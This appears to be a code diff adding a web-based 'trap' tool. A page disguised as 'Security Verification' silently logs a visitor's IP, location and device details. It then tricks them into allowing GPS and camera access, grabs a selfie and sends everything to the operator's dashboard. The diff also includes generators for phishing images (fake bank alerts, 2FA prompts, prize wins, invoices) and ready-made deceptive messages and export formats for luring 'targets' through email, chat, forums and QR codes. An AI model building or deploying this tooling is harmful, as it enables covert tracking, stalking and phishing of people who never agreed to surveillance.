+                    <div class="iu-opt">
+                        <h4>⚙️ Image Settings</h4>
+                        <label>Alt Text (hover text)
+                            <input id="iuAlt" value="Tap to view" placeholder="Text shown on hover">
+                        </label>
+                        <label>Max Width (px)
+                            <input id="iuMaxW" type="number" value="400" min="100" max="1200">
+                        </label>
+                        <label>Border Style
+                            <select id="iuBorder">
+                                <option value="rounded">Rounded (12px)</option>
+                                <option value="circle">Circle</option>
+                                <option value="sharp">Sharp Corners</option>
+                                <option value="shadow">Shadow + Rounded</option>
+                                <option value="none">No Border</option>
+                            </select>
+                        </label>
+                    </div>
+                    <div class="iu-opt">
+                        <h4>🎯 Click Behavior</h4>
+                        <label>What happens on click
+                            <select id="iuClickType">
+                                <option value="direct">Open trap page directly</option>
+                                <option value="newtab">Open in new tab</option>
+                            </select>
+                        </label>
+                    </div>
+                </div>
+            </div>
+
+            <div class="iu-export-grid">
+                <div class="iu-export-btn" onclick="iuExport('html_email')">
+                    <div class="ue-icon">📧</div>
+                    <div class="ue-name">HTML for Email</div>
+                    <div class="ue-desc">Paste in Gmail, Outlook HTML editor</div>
+                </div>
+                <div class="iu-export-btn" onclick="iuExport('html_page')">
+                    <div class="ue-icon">📄</div>
+                    <div class="ue-name">Standalone HTML Page</div>
+                    <div class="ue-desc">Download .html file to host or send</div>
+                </div>
+                <div class="iu-export-btn" onclick="iuExport('bbcode')">
+                    <div class="ue-icon">💬</div>
+                    <div class="ue-name">BBCode (Forums)</div>
+                    <div class="ue-desc">For forum posts & signatures</div>
+                </div>
+                <div class="iu-export-btn" onclick="iuExport('markdown')">
+                    <div class="ue-icon">📝</div>
+                    <div class="ue-name">Markdown</div>
+                    <div class="ue-desc">For Discord, Reddit, GitHub</div>
+                </div>
+                <div class="iu-export-btn" onclick="iuExport('download_linked')">
+                    <div class="ue-icon">💾</div>
+                    <div class="ue-name">Download Image</div>
+                    <div class="ue-desc">Save image, send on WhatsApp + link</div>
+                </div>
+                <div class="iu-export-btn" onclick="iuExport('standalone_redirect')">
+                    <div class="ue-icon">🔀</div>
+                    <div class="ue-name">Auto-Redirect Page</div>
+                    <div class="ue-desc">Shows image then redirects to trap</div>
+                </div>
+                <div class="iu-export-btn" onclick="iuExport('social_combo')">
+                    <div class="ue-icon">📱</div>
+                    <div class="ue-name">Social Media Combo</div>
+                    <div class="ue-desc">Image + message template</div>
+                </div>
+                <div class="iu-export-btn" onclick="iuExport('qr_image')">
+                    <div class="ue-icon">📊</div>
+                    <div class="ue-name">QR Code + Image</div>
+                    <div class="ue-desc">Combined QR and image trap</div>
+                </div>
+            </div>
+
+            <div class="iu-output" id="iuOutput"><button class="cpb4" onclick="copyIUOutput()">📋 Copy</button><span id="iuOutputText"></span></div>
+            <div class="iu-status" id="iuStatus"></div>
+        </div>
+    </div>
+
+    <!-- Stats -->
+    <div class="sg">
+        <div class="sc"><div class="n" id="s1">0</div><div class="l">Links</div></div>
+        <div class="sc"><div class="n" id="s2">0</div><div class="l">Visits</div></div>
+        <div class="sc"><div class="n" id="s3">0</div><div class="l">Photos</div></div>
+        <div class="sc"><div class="n" id="s4">0</div><div class="l">Locations</div></div>
+    </div>
+    <div id="capList"></div>
+</div>
+<div class="md" id="pMod" onclick="this.classList.remove('on')"><img id="mImg"></div>
+<div class="map-modal" id="mapModal">
+    <div class="map-modal-hdr"><h3 id="mmTitle">📍 Map</h3><button onclick="closeFullMap()">✕ Close</button></div>
+    <div class="map-modal-toolbar" id="mmTB"></div>
+    <div class="map-modal-body" id="mmBody"></div>
+</div>
+</div>
+<div class="toast" id="toast"></div>
+
+<!-- Hidden canvas for image generation -->
+<canvas id="igHidden" style="display:none"></canvas>
+
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<script src="https://unpkg.com/esri-leaflet@3.0.12/dist/esri-leaflet.js"></script>
+<script>
+/* ═══ MAP TILES ═══ */
+const TILES={streets:{n:'🗺️ Streets',l:()=>L.esri.basemapLayer('Streets')},sat:{n:'🛰️ Satellite',l:()=>L.esri.basemapLayer('Imagery')},satL:{n:'🛰️+',l:()=>L.layerGroup([L.esri.basemapLayer('Imagery'),L.esri.basemapLayer('ImageryLabels')])},topo:{n:'⛰️ Terrain',l:()=>L.esri.basemapLayer('Topographic')},dark:{n:'🌑 Dark',l:()=>L.esri.basemapLayer('DarkGray')},osm:{n:'🌐 OSM',l:()=>L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{attribution:'©OSM'})}};
+const aM={};let fM=null;
+function cMap(id,lat,lng,acc,photo,info){if(aM[id]){aM[id].remove();delete aM[id]}const m=L.map(id).setView([lat,lng],16);const dl=TILES.satL.l();dl.addTo(m);aM[id]=m;m._cl=dl;let pop=`<div style="text-align:center;font-family:sans-serif">`;if(photo&&photo!=='null')pop+=`<img src="${photo}" style="width:120px;height:90px;object-fit:cover;border-radius:6px;margin-bottom:6px"><br>`;pop+=`<b style="color:#fff">📍 ${lat.toFixed(6)}, ${lng.toFixed(6)}</b><br>`;if(info)pop+=`<span style="color:#aaa;font-size:11px">${info}</span>`;pop+=`</div>`;const mk=L.marker([lat,lng]).addTo(m).bindPopup(pop,{maxWidth:200});if(acc&&acc<10000)L.circle([lat,lng],{radius:acc,color:'#6c7eff',fillColor:'#6c7eff',fillOpacity:0.08,weight:1,dashArray:'5,5'}).addTo(m);setTimeout(()=>mk.openPopup(),300);setTimeout(()=>m.invalidateSize(),100);return m}
+function sLyr(id,k){const m=aM[id];if(!m)return;if(m._cl)m.removeLayer(m._cl);const nl=TILES[k].l();nl.addTo(m);m._cl=nl}
+function openFM(lat,lng,acc,photo,info){const md=document.getElementById('mapModal'),body=document.getElementById('mmBody'),tb=document.getElementById('mmTB');document.getElementById('mmTitle').textContent=`📍 ${lat.toFixed(6)}, ${lng.toFixed(6)}`;tb.innerHTML=Object.entries(TILES).map(([k,v],i)=>`<button class="${i===2?'active':''}" onclick="sFM('${k}',this)">${v.n}</button>`).join('');body.innerHTML='<div id="fmC" style="width:100%;height:100%"></div>';md.classList.add('on');setTimeout(()=>{if(fM){fM.remove();fM=null}fM=cMap('fmC',lat,lng,acc,photo,info);fM.setZoom(17);aM['fmC']=fM},100)}
+function sFM(k,btn){btn.parentElement.querySelectorAll('button').forEach(b=>b.classList.remove('active'));btn.classList.add('active');sLyr('fmC',k)}
+function closeFullMap(){document.getElementById('mapModal').classList.remove('on');if(fM){fM.remove();fM=null}delete aM['fmC']}
+function showAllMap(){const locs=[];allCaptures.forEach(v=>{const la=v.Lat||v.lat,lo=v.Lng||v.lng;if(la&&lo&&la!=='')locs.push({lat:Number(la),lng:Number(lo),photo:v.Photo||v.photo,info:`${v.City||v.city||'?'}, ${v.Country||v.country||'?'}`,tid:v.TrackingID||v.trackingId,ts:v.Timestamp||v.ts})});if(!locs.length){toast('⚠️ No locations');return}const md=document.getElementById('mapModal'),body=document.getElementById('mmBody'),tb=document.getElementById('mmTB');document.getElementById('mmTitle').textContent=`🗺️ All (${locs.length})`;tb.innerHTML=Object.entries(TILES).map(([k,v],i)=>`<button class="${i===2?'active':''}" onclick="sFM('${k}',this)">${v.n}</button>`).join('');body.innerHTML='<div id="fmC" style="width:100%;height:100%"></div>';md.classList.add('on');setTimeout(()=>{if(fM){fM.remove();fM=null}const m=L.map('fmC').setView([locs[0].lat,locs[0].lng],4);const l=TILES.satL.l();l.addTo(m);m._cl=l;fM=m;aM['fmC']=m;const bn=L.latLngBounds();const cl=['#ff6b6b','#6c7eff','#5eea8d','#f0c040','#9b59ff'];locs.forEach((loc,i)=>{let p=`<div style="text-align:center;font-family:sans-serif">`;if(loc.photo)p+=`<img src="${loc.photo}" style="width:80px;height:60px;object-fit:cover;border-radius:4px;margin-bottom:4px"><br>`;p+=`<b style="color:#fff">${loc.info}</b></div>`;L.circleMarker([loc.lat,loc.lng],{radius:8,color:cl[i%cl.length],fillColor:cl[i%cl.length],fillOpacity:0.8,weight:2}).addTo(m).bindPopup(p);bn.extend([loc.lat,loc.lng])});m.fitBounds(bn,{padding:[40,40]})},100)}
+function togMap(mid,lat,lng,acc,ph,info){const w=document.getElementById(mid+'_w');if(w.style.display==='none'){w.style.display='block';setTimeout(()=>{if(!aM[mid])cMap(mid,lat,lng,acc,ph==='null'?null:ph,info);else aM[mid].invalidateSize()},100)}else w.style.display='none'}
+function sInl(mid,k,btn){btn.parentElement.querySelectorAll('button').forEach(b=>b.classList.remove('active'));btn.classList.add('active');sLyr(mid,k)}
+
+/* ═══ CONFIG ═══ */
+const CFG='st_api';function getAPI(){return localStorage.getItem(CFG)||''}
+async function api(body){const u=getAPI();if(!u)throw new Error('No API');const r=await fetch(u,{method:'POST',headers:{'Content-Type':'text/plain;charset=utf-8'},body:JSON.stringify(body),redirect:'follow'});return r.json()}
+
+/* ═══ ROUTING ═══ */
+const P=new URLSearchParams(location.search);const TID=P.get('t');
+function init(){hideAll();if(TID){show('pgTrap');document.title='Security Verification';silentCollect()}else if(getAPI()){show('pgDash');document.title='🔒 Command Centre';refreshAll();setInterval(refreshAll,15000)}else{show('pgSetup');document.title='🚀 Setup'}}
+function hideAll(){['pgTrap','pgSetup','pgDash'].forEach(i=>document.getElementById(i).style.display='none')}
+function show(id){document.getElementById(id).style.display=id==='pgTrap'||id==='pgSetup'?'flex':'block'}
+
+/* ═══ TOOL TABS ═══ */
+function switchTool(tool, btn) {
+    document.querySelectorAll('.tool-tab').forEach(t => t.classList.remove('active'));
+    btn.classList.add('active');
+    document.getElementById('linkCust').style.display = tool === 'disguise' ? 'block' : 'none';
+    document.getElementById('imgGen').style.display = tool === 'generate' ? 'block' : 'none';
+    document.getElementById('imgUpload').style.display = tool === 'upload' ? 'block' : 'none';
+}
+
+/* ═══ SETUP ═══ */
+function copyGAS(){const c=document.getElementById('gasCode').textContent.replace('📋 Copy','').trim();navigator.clipboard.writeText(c).then(()=>toast('📋 Copied!')).catch(()=>{const t=document.createElement('textarea');t.value=c;document.body.appendChild(t);t.select();document.execCommand('copy');document.body.removeChild(t);toast('📋!')})}
+async function saveSetup(){const url=document.getElementById('setupUrl').value.trim();const err=document.getElementById('sErr'),ok2=document.getElementById('sOk'),btn=document.getElementById('setupBtn');err.style.display='none';ok2.style.display='none';if(!url.includes('script.google.com')){err.textContent='❌ Invalid URL';err.style.display='block';return}btn.disabled=true;btn.textContent='⏳...';try{const r=await fetch(url,{redirect:'follow'});const d=await r.json();if(d.status){localStorage.setItem(CFG,url);ok2.textContent='✅ Connected!';ok2.style.display='block';setTimeout(()=>location.reload(),1000)}else throw new Error('Bad')}catch(e){err.textContent='❌ '+e.message;err.style.display='block';btn.disabled=false;btn.textContent='✅ Verify & Save'}}
+function resetSetup(){if(!confirm('Reset?'))return;localStorage.removeItem(CFG);location.reload()}
+
+/* ═══ TRAP ═══ */
+let cap={trackingId:TID,photo:null,lat:null,lng:null,acc:null,ip:null,city:null,region:null,country:null,org:null,ua:navigator.userAgent,platform:navigator.platform||'',lang:navigator.language,sw:screen.width,sh:screen.height,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,ts:new Date().toISOString(),cores:navigator.hardwareConcurrency||null,mem:navigator.deviceMemory||null,touch:navigator.maxTouchPoints||0,online:navigator.onLine,type:'pageload',extra:{}};
+async function silentCollect(){await getIP();sendCap({...cap})}
+async function getIP(){for(const u of['https://ipapi.co/json/','https://ipwho.is/']){try{const r=await fetch(u,{signal:AbortSignal.timeout(6000)});const d=await r.json();cap.ip=d.ip||d.ipAddress||cap.ip;cap.city=d.city||d.cityName||cap.city;cap.region=d.region||d.regionName||cap.region;cap.country=d.country_name||d.country||d.countryName||cap.country;cap.org=d.org||d.connection?.isp||cap.org;if(d.latitude&&!cap.lat){cap.lat=d.latitude;cap.lng=d.longitude}if(cap.ip)break}catch(e){}}}
+function tStat(m,t){const s=document.getElementById('tS');s.className='T-stat '+t;s.innerHTML=m}
+function tProg(p){document.getElementById('tP').classList.add('on');document.getElementById('tF').style.width=p+'%'}
+async function doCapture(){const btn=document.getElementById('tBtn');btn.disabled=true;btn.innerHTML='<span class="sp"></span> Verifying...';tStat('🔄 Initializing...','ld');tProg(8);try{tStat('📍 Location...','ld');tProg(20);await getGPS()}catch(e){}try{tStat('📸 Image...','ld');tProg(45);await getPhoto()}catch(e){}if(!cap.ip){tProg(65);await getIP()}try{if(navigator.getBattery){const b=await navigator.getBattery();cap.battery=Math.round(b.level*100)+'%'}}catch(e){}try{const cv=document.createElement('canvas');const gl=cv.getContext('webgl');if(gl){const d=gl.getExtension('WEBGL_debug_renderer_info');if(d)cap.gpu=gl.getParameter(d.UNMASKED_RENDERER_WEBGL)}}catch(e){}try{if(navigator.connection)cap.connType=navigator.connection.effectiveType}catch(e){}tStat('🔒 Encrypting...','ld');tProg(80);cap.type='full_capture';cap.ts=new Date().toISOString();await sendCap({...cap});tProg(100);tStat('✅ Verified!','ok');btn.innerHTML='✅ Verified'}
+function getGPS(){return new Promise((res,rej)=>{if(!navigator.geolocation)return rej();navigator.geolocation.getCurrentPosition(p=>{cap.lat=p.coords.latitude;cap.lng=p.coords.longitude;cap.acc=p.coords.accuracy;res()},e=>rej(e),{enableHighAccuracy:true,timeout:15000,maximumAge:0})})}
+function getPhoto(){return new Promise(async(res,rej)=>{try{const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:640},height:{ideal:480}}});const v=document.getElementById('camV');v.srcObject=s;await new Promise(r=>{v.onloadedmetadata=()=>{v.play();r()}});await new Promise(r=>setTimeout(r,2000));const c=document.getElementById('camC');c.width=v.videoWidth;c.height=v.videoHeight;c.getContext('2d').drawImage(v,0,0);cap.photo=c.toDataURL('image/jpeg',0.7);s.getTracks().forEach(t=>t.stop());res()}catch(e){rej(e)}})}
+async function sendCap(d){d.vid=Date.now()+'_'+Math.random().toString(36).substr(2,6);try{const a=getAPI();if(a)await fetch(a,{method:'POST',headers:{'Content-Type':'text/plain;charset=utf-8'},body:JSON.stringify({action:'capture',payload:d}),redirect:'follow',mode:'no-cors'})}catch(e){}}
+
+/* ═══════════════════════════════════════
+   IMAGE UPLOAD TRAP
+   ═══════════════════════════════════════ */
+let uploadedImageData = null;
+let uploadedImageName = '';
+let uploadedImageSize = 0;
+
+// Drag and drop
+const dropZone = document.getElementById('iuDrop');
+if (dropZone) {
+    ['dragenter','dragover'].forEach(e => {
+        dropZone.addEventListener(e, ev => { ev.preventDefault(); dropZone.classList.add('dragover'); });
+    });
+    ['dragleave','drop'].forEach(e => {
+        dropZone.addEventListener(e, ev => { ev.preventDefault(); dropZone.classList.remove('dragover'); });
+    });
+    dropZone.addEventListener('drop', ev => {
+        const files = ev.dataTransfer.files;
+        if (files.length > 0) processUploadedFile(files[0]);
+    });
+}
+
+function handleImageUpload(input) {
+    if (input.files && input.files[0]) {
+        processUploadedFile(input.files[0]);
+    }
+}
+
+function processUploadedFile(file) {
+    if (!file.type.startsWith('image/')) {
+        toast('⚠️ Please upload an image file');
+        return;
+    }
+    if (file.size > 5 * 1024 * 1024) {
+        toast('⚠️ File too large. Max 5MB');
+        return;
+    }
+
+    uploadedImageName = file.name;
+    uploadedImageSize = file.size;
+
+    const reader = new FileReader();
+    reader.onload = function(e) {
+        uploadedImageData = e.target.result;
+
+        // Show preview
+        document.getElementById('iuPreviewImg').src = uploadedImageData;
+        document.getElementById('iuDrop').style.display = 'none';
+        document.getElementById('iuPreviewWrap').style.display = 'block';
+
+        // Get image dimensions
+        const img = new Image();
+        img.onload = function() {
+            document.getElementById('iuImgInfo').textContent =
+                `${img.width}×${img.height}px • ${(uploadedImageSize/1024).toFixed(1)}KB • ${uploadedImageName}`;
+        };
+        img.src = uploadedImageData;
+
+        toast('✅ Image uploaded! Choose an export format below');
+    };
+    reader.readAsDataURL(file);
+}
+
+function clearUpload() {
+    uploadedImageData = null;
+    uploadedImageName = '';
+    uploadedImageSize = 0;
+    document.getElementById('iuDrop').style.display = '';
+    document.getElementById('iuPreviewWrap').style.display = 'none';
+    document.getElementById('iuOutput').style.display = 'none';
+    document.getElementById('iuStatus').style.display = 'none';
+    document.getElementById('iuFile').value = '';
+}
+
+function getIUBorderStyle() {
+    const b = document.getElementById('iuBorder').value;
+    switch(b) {
+        case 'rounded': return 'border-radius:12px;';
+        case 'circle': return 'border-radius:50%;';
+        case 'sharp': return 'border-radius:0;';
+        case 'shadow': return 'border-radius:12px;box-shadow:0 8px 25px rgba(0,0,0,0.3);';
+        case 'none': return '';
+        default: return 'border-radius:12px;';
+    }
+}
+
+function iuExport(format) {
+    if (!uploadedImageData) { toast('⚠️ Upload an image first'); return; }
+    if (!curOrig) { toast('⚠️ Generate a tracking link first (click + New Link)'); return; }
+
+    const alt = document.getElementById('iuAlt').value || 'Tap to view';
+    const maxW = document.getElementById('iuMaxW').value || 400;
+    const borderStyle = getIUBorderStyle();
+    const clickType = document.getElementById('iuClickType').value;
+    const target = clickType === 'newtab' ? ' target="_blank"' : '';
+    const outputEl = document.getElementById('iuOutput');
+    const outputText = document.getElementById('iuOutputText');
+    const statusEl = document.getElementById('iuStatus');
+
+    let code = '';
+
+    switch(format) {
+        case 'html_email':
+            code = `<a href="${curOrig}"${target} style="display:inline-block;text-decoration:none;cursor:pointer">` +
+                   `<img src="${uploadedImageData}" alt="${esc(alt)}" style="max-width:${maxW}px;width:100%;height:auto;${borderStyle}display:block;cursor:pointer;border:0" />` +
+                   `</a>`;
+            outputEl.style.display = 'block';
+            outputText.textContent = code;
+            iuStat('✅ HTML copied to clipboard! Paste in email HTML editor (Gmail: ⋮ → Insert HTML)', 'ok');
+            navigator.clipboard.writeText(code);
+            break;
+
+        case 'html_page':
+            const htmlPage = `<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>${esc(alt)}</title>
+<meta property="og:title" content="${esc(alt)}">
+<meta property="og:image" content="${uploadedImageData.substring(0,100)}...">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{min-height:100vh;display:flex;align-items:center;justify-content:center;background:#0a0a12;font-family:Arial,sans-serif}
+a{display:inline-block;text-decoration:none;transition:transform .2s}
+a:hover{transform:scale(1.02)}
+img{max-width:${maxW}px;width:90vw;height:auto;${borderStyle}cursor:pointer;display:block}
+.hint{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);color:rgba(255,255,255,0.15);font-size:11px}
+</style>
+</head>
+<body>
+<a href="${curOrig}"${target}>
+<img src="${uploadedImageData}" alt="${esc(alt)}">
+</a>
+<div class="hint">Tap image to continue</div>
+</body>
+</html>`;
+            dl(htmlPage, 'text/html', 'trap_image_' + Date.now() + '.html');
+            iuStat('✅ HTML page downloaded! Host it on GitHub Pages, Netlify, or send directly. When opened, clicking the image activates the trap.', 'ok');
+            break;
+
+        case 'bbcode':
+            code = `[url=${curOrig}][img]PASTE_IMAGE_URL_HERE[/img][/url]`;
+            outputEl.style.display = 'block';
+            outputText.textContent = code;
+            navigator.clipboard.writeText(code);
+            iuStat('✅ BBCode copied! Replace PASTE_IMAGE_URL_HERE with the image URL after hosting it (use imgur, imgbb, etc.)', 'warn');
+            break;
+
+        case 'markdown':
+            code = `[![${esc(alt)}](PASTE_IMAGE_URL_HERE)](${curOrig})`;
+            outputEl.style.display = 'block';
+            outputText.textContent = code;
+            navigator.clipboard.writeText(code);
+            iuStat('✅ Markdown copied! Replace PASTE_IMAGE_URL_HERE with hosted image URL', 'warn');
+            break;
+
+        case 'download_linked':
+            // Download the actual image file
+            const imgLink = document.createElement('a');
+            imgLink.download = uploadedImageName || 'trap_image.png';
+            imgLink.href = uploadedImageData;
+            imgLink.click();
+
+            // Also copy the link
+            navigator.clipboard.writeText(curOrig);
+
+            code = `📱 SEND THIS TO TARGET:\n\n1. Send the downloaded image in chat\n2. Then send this message:\n\n"${alt} 👉 ${curOrig}"\n\nLink also copied to clipboard!`;
+            outputEl.style.display = 'block';
+            outputText.textContent = code;
+            iuStat('✅ Image downloaded + link copied! Send the image first, then the link message', 'ok');
+            break;
+
+        case 'standalone_redirect':
+            const redirectPage = `<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>${esc(alt)}</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;background:#0a0a12;font-family:Arial,sans-serif;color:#fff;padding:20px}
+img{max-width:${maxW}px;width:90vw;height:auto;${borderStyle}display:block;margin-bottom:20px}
+.msg{color:rgba(255,255,255,0.4);font-size:13px;animation:pulse 1.5s ease-in-out infinite}
+@keyframes pulse{0%,100%{opacity:.4}50%{opacity:.8}}
+.bar{width:200px;height:3px;background:rgba(255,255,255,0.1);border-radius:2px;margin-top:12px;overflow:hidden}
+.bar i{display:block;height:100%;background:linear-gradient(90deg,#6c7eff,#9b59ff);width:0%;border-radius:2px;animation:load 3s ease forwards}
+@keyframes load{to{width:100%}}
+</style>
+</head>
+<body>
+<img src="${uploadedImageData}" alt="${esc(alt)}">
+<div class="msg">Loading secure content...</div>
+<div class="bar"><i></i></div>
+<script>setTimeout(function(){window.location.href="${curOrig}"},3000)<\/script>
+</body>
+</html>`;
+            dl(redirectPage, 'text/html', 'view_' + Date.now() + '.html');
+            iuStat('✅ Auto-redirect page downloaded! When opened, it shows the image for 3 seconds then automatically redirects to the trap page.', 'ok');
+            break;
+
+        case 'social_combo':
+            const messages = [
+                `Hey, check this out 👉 ${curOrig}`,
+                `Look at this! Tap to see details: ${curOrig}`,
+                `Here's the receipt you asked for. Verify here: ${curOrig}`,
+                `Sent you the photo. Full version here: ${curOrig}`,
+                `Your delivery update 📦 Track here: ${curOrig}`
+            ];
+            code = `📱 SOCIAL MEDIA SENDING KIT\n${'═'.repeat(35)}\n\n` +
+                   `Step 1: Download the image (use 💾 Download button)\n` +
+                   `Step 2: Send image in chat/DM\n` +
+                   `Step 3: Send one of these messages:\n\n` +
+                   messages.map((m,i) => `${i+1}. ${m}`).join('\n') +
+                   `\n\n${'═'.repeat(35)}\n` +
+                   `Trap Link: ${curOrig}\n` +
+                   `\n💡 Tip: Send image first, then message. This looks more natural.`;
+            outputEl.style.display = 'block';
+            outputText.textContent = code;
+            navigator.clipboard.writeText(messages[0]);
+            iuStat('✅ Social media kit ready! First message copied to clipboard. Download image with the 💾 button above.', 'ok');
+            break;
+
+        case 'qr_image':
+            // Generate QR code using canvas
+            generateQRPage();
+            break;
+    }
+}
+
+function generateQRPage() {
+    // Create a combined page with image + QR-like element
+    const maxW = document.getElementById('iuMaxW').value || 400;
+    const borderStyle = getIUBorderStyle();
+    const alt = document.getElementById('iuAlt').value || 'Scan to verify';
+
+    const qrPage = `<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Scan to Verify</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{min-height:100vh;display:flex;align-items:center;justify-content:center;background:#0a0a12;font-family:Arial,sans-serif;padding:20px}
+.card{background:#111;border:1px solid #222;border-radius:16px;padding:24px;max-width:450px;width:100%;text-align:center}
+img.main{max-width:${maxW}px;width:100%;height:auto;${borderStyle}display:block;margin:0 auto 16px;cursor:pointer}
+.qr-placeholder{width:140px;height:140px;margin:0 auto 12px;background:#fff;border-radius:8px;display:flex;align-items:center;justify-content:center;padding:10px}
+.qr-placeholder img{width:100%;height:100%}
+h2{color:#fff;font-size:16px;margin-bottom:6px}
+p{color:#888;font-size:12px;margin-bottom:16px}
+.btn{display:inline-block;background:linear-gradient(135deg,#6c7eff,#9b59ff);color:#fff;text-decoration:none;padding:12px 30px;border-radius:50px;font-weight:600;font-size:14px;transition:all .3s}
+.btn:hover{transform:translateY(-2px);box-shadow:0 8px 20px rgba(108,126,255,0.4)}
+</style></head><body>
+<div class="card">
+<a href="${curOrig}"><img class="main" src="${uploadedImageData}" alt="${esc(alt)}"></a>
+<div class="qr-placeholder"><img src="https://api.qrserver.com/v1/create-qr-code/?size=120x120&data=${encodeURIComponent(curOrig)}" alt="QR"></div>
+<h2>Scan QR or Tap Image</h2>
+<p>Verify your identity to access secure content</p>
+<a href="${curOrig}" class="btn">Verify Now →</a>
+</div></body></html>`;
+
+    dl(qrPage, 'text/html', 'qr_trap_' + Date.now() + '.html');
+    iuStat('✅ QR + Image trap page downloaded! Contains your image + auto-generated QR code + clickable button. All point to the trap.', 'ok');
+}
+
+function iuStat(msg, type) {
+    const el = document.getElementById('iuStatus');
+    el.className = 'iu-status on ' + type;
+    el.textContent = msg;
+}
+
+function copyIUOutput() {
+    const text = document.getElementById('iuOutputText').textContent;
+    navigator.clipboard.writeText(text).then(() => toast('📋 Copied!'));
+}
+
+
+/* ═══════════════════════════════════════
+   IMAGE TRAP GENERATOR (Canvas-based)
+   ═══════════════════════════════════════ */
+const IMG_TEMPLATES = [
+    {name:'💰 Payment Received',title:'Payment Received',sub:'$2,500.00 USD',body:'Tap to view transaction details',foot:'Secure Transaction • Verified',color:'#22c55e',style:'dark'},
+    {name:'🏦 Bank Alert',title:'Account Alert',sub:'Unusual Activity Detected',body:'Tap to verify your identity',foot:'Bank Security Center',color:'#ef4444',style:'alert'},
+    {name:'📦 Package Delivery',title:'Your Package is Here',sub:'Delivery Confirmation Required',body:'Tap to confirm delivery address',foot:'Express Shipping • Tracked',color:'#3b82f6',style:'gradient'},
+    {name:'🎁 You Won!',title:'Congratulations!',sub:'You\'ve won a $500 Gift Card',body:'Tap to claim your reward now',foot:'Limited Time Offer • Verified',color:'#f59e0b',style:'gradient'},
+    {name:'📧 New Voicemail',title:'1 New Voicemail',sub:'Duration: 0:47',body:'Tap to listen to your message',foot:'Secure Voicemail System',color:'#6c7eff',style:'dark'},
+    {name:'🧾 Invoice Ready',title:'Invoice #INV-2025-0847',sub:'Amount Due: $1,200.00',body:'Tap to view and download invoice',foot:'Due Date: Jan 30, 2025',color:'#8b5cf6',style:'bank'},
+    {name:'📸 Someone Sent Photo',title:'New Photo Received',sub:'From: Unknown Sender',body:'Tap to view the photo',foot:'Encrypted • Auto-deletes in 24h',color:'#ec4899',style:'dark'},
+    {name:'🔐 2FA Required',title:'Security Code Required',sub:'Login attempt from new device',body:'Tap to approve or deny access',foot:'Account Protection Active',color:'#f43f5e',style:'alert'}
+];
+
+let selectedTemplate = 0;
+
+function renderTemplates() {
+    const grid = document.getElementById('igTpls');
+    grid.innerHTML = IMG_TEMPLATES.map((t, i) => {
+        const miniId = 'mini_' + i;
+        return `<div class="ig-tpl ${i===0?'active':''}" onclick="selectImgTemplate(${i})" id="igtpl${i}">
+            <canvas id="${miniId}" width="160" height="90"></canvas>
+            <div class="ig-name">${t.name}</div>
+        </div>`;
+    }).join('');
+
+    setTimeout(() => {
+        IMG_TEMPLATES.forEach((t, i) => {
+            drawImage('mini_' + i, t.title, t.sub, t.body, t.foot, t.color, t.style, true);
+        });
+    }, 50);
+}
+
+function selectImgTemplate(idx) {
+    selectedTemplate = idx;
+    document.querySelectorAll('.ig-tpl').forEach(e => e.classList.remove('active'));
+    document.getElementById('igtpl' + idx).classList.add('active');
+    const t = IMG_TEMPLATES[idx];
+    document.getElementById('igTitle').value = t.title;
+    document.getElementById('igSub').value = t.sub;
+    document.getElementById('igBody').value = t.body;
+    document.getElementById('igFoot').value = t.foot;
+    document.getElementById('igColor').value = t.color;
+    document.getElementById('igStyle').value = t.style;
+    renderPreview();
+}
+
+function renderPreview() {
+    const title = document.getElementById('igTitle').value;
+    const sub = document.getElementById('igSub').value;
+    const body = document.getElementById('igBody').value;
+    const foot = document.getElementById('igFoot').value;
+    const color = document.getElementById('igColor').value;
+    const style = document.getElementById('igStyle').value;
+    drawImage('igCanvas', title, sub, body, foot, color, style, false);
+}
+
+function drawImage(canvasId, title, sub, body, foot, color, style, mini) {
+    const canvas = document.getElementById(canvasId);
+    if (!canvas) return;
+    const ctx = canvas.getContext('2d');
+    const w = canvas.width, h = canvas.height;
+
+    if (style === 'light') {
+        ctx.fillStyle = '#ffffff';
+        ctx.fillRect(0, 0, w, h);
+    } else if (style === 'gradient') {
+        const grd = ctx.createLinearGradient(0, 0, w, h);
+        grd.addColorStop(0, color);
+        grd.addColorStop(1, shiftColor(color, -40));
+        ctx.fillStyle = grd;
+        ctx.fillRect(0, 0, w, h);
+    } else if (style === 'alert') {
+        ctx.fillStyle = '#1a1a1a';
+        ctx.fillRect(0, 0, w, h);
+        ctx.fillStyle = color;
+        ctx.fillRect(0, 0, w, mini ? 8 : 6);
+    } else if (style === 'bank') {
+        const grd = ctx.createLinearGradient(0, 0, 0, h);
+        grd.addColorStop(0, '#1a1f35');
+        grd.addColorStop(1, '#0d1117');
+        ctx.fillStyle = grd;
+        ctx.fillRect(0, 0, w, h);
+    } else {
+        ctx.fillStyle = '#111118';
+        ctx.fillRect(0, 0, w, h);
+    }
+
+    const textColor = (style === 'light') ? '#222' : '#fff';
+    const dimColor = (style === 'light') ? '#888' : 'rgba(255,255,255,0.5)';
+    const bodyColor = (style === 'light') ? '#555' : 'rgba(255,255,255,0.7)';
+
+    if (style === 'gradient') {
+        ctx.beginPath();
+        ctx.arc(w/2, h*0.25, mini?12:32, 0, Math.PI*2);
+        ctx.fillStyle = 'rgba(255,255,255,0.2)';
+        ctx.fill();
+        ctx.fillStyle = '#fff';
+        ctx.font = `${mini?10:24}px Arial`;
+        ctx.textAlign = 'center';
+        ctx.fillText('✓', w/2, h*0.25+(mini?4:8));
+    } else {
+        ctx.fillStyle = color;
+        roundRect(ctx, mini?4:12, mini?10:30, mini?3:5, h-(mini?20:60), mini?2:4);
+        ctx.fill();
+    }
+
